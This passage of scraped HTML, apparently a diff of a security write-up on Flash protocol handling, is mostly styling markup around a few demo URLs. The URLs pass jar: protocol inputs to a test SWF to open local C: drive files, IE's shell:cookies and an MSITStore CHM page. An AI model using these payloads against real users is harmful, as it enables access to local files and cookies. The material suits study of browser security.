!important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:file:/c:</code></div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div>
+
+<p>Jar protocol ? Opens a file in your local C drive:</p>
+<div style="color:#555555;font-family:Arial, Tahoma, Verdana;line-height:20px;"><div id="highlighter_315252" class="syntaxhighlighter plain" style="width:630px;margin:1em 0px !important;position:relative !important;overflow-x:auto !important;overflow-y:hidden !important;font-size:1em !important;background-color:black !important;"><table border="0" cellpadding="0" cellspacing="0" style="width:651.3333129882813px;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br></td><br><td class="code" style="width:624px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:file:/c:windowsStarter.xml</code></div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div>
+
+<p>Jar protocol ? Opens other restricted protocols in IE ? example 1:</p>
+<div style="color:#555555;font-family:Arial, Tahoma, Verdana;line-height:20px;"><div id="highlighter_84683" class="syntaxhighlighter plain" style="width:630px;margin:1em 0px !important;position:relative !important;overflow-x:auto !important;overflow-y:hidden !important;font-size:1em !important;background-color:black !important;"><table border="0" cellpadding="0" cellspacing="0" style="width:630px;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br></td><br><td class="code" style="width:602.6666870117188px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:shell:cookies</code></div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div>
+
+<p>Jar protocol ? Opens other restricted protocols in IE ? example 2:</p>
+<div style="color:#555555;font-family:Arial, Tahoma, Verdana;line-height:20px;"><div id="highlighter_351187" class="syntaxhighlighter plain" style="width:630px;margin:1em 0px !important;position:relative !important;overflow-x:auto !important;overflow-y:hidden !important;font-size:1em !important;background-color:black !important;"><table border="0" cellpadding="0" cellspacing="0" style="width:1118px;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br></td><br><td class="code" style="width:1090.6666259765625px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:mk:@MSITStore:C:WindowsHelpmui 409certmgr.CHM::/html/355962c2-4f6b-4cbd-ab00-6e7ee4dddc16.htm</code></div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline 